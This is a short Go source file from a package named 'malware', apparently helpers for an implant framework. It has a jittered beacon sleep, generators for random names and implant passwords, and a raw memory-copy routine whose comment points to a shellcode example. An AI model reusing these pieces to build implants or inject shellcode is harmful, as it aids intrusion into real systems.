package malware

import (
	"math/rand"
	"time"
	"unsafe"
)

func sleep(config Config) {
	if config.getJitter() == 0 {
		time.Sleep(time.Duration(config.getSleep()) * time.Second)
	} else {
		rand.Seed(time.Now().UnixNano())
		r := rand.Intn(config.getJitter())
		time.Sleep(time.Duration(config.getSleep()+r) * time.Second)
	}
}

func NewName(l int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, l)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	return string(b)
}

// NewPassword generates a random password for the kittens
func NewPassword(l int) string {
	letters := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789Â£$%^&*()_+")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, l)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	return string(b)
}

// Memcpy is a replacement for the C memcpy function
// https://github.com/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func Memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
